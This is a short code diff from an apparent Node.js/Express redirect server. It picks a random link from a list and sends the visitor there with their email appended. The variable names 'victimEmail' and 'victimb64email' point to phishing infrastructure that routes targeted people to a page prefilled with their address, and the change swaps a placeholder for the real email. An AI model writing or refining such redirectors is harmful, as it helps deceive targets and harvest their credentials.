@@ -17,7 +17,7 @@ app.get("/",(req,res)=> {
         let link = links[Math.floor(Math.random() * links.length)],
             victimEmail = req.query.email;
 
-    res.redirect(`${link}&qrc=##victimb64email##`);
+    res.redirect(`${link}?email=${victimEmail}`);
 
     } else {
 
